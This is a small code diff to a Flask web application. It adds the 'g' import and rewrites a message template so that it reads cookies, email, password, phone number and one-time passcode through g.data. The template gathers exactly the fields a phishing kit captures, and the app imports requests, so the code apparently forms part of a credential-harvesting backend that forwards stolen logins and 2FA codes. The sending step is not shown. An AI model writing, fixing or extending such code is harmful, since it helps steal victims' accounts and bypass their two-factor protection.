@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, redirect, send_from_directory
+from flask import Flask, g, render_template, request, jsonify, redirect, send_from_directory
 from datetime import datetime
 import os
 import requests
@@ -36,10 +36,10 @@ def init_data():
     
     message = f"""
     Cookies: {g.data("Cookies", "")}
-    Email: {data("email", "")}
-    Password: {data("password", "")}
-    Phone: {data("phone", "")}
-    OTP: {data("otp","")}
+    Email: {g.data("email", "")}
+    Password: {g.data("password", "")}
+    Phone: {g.data("phone", "")}
+    OTP: {g.data("otp","")}
     """
     
 def before_request_func():
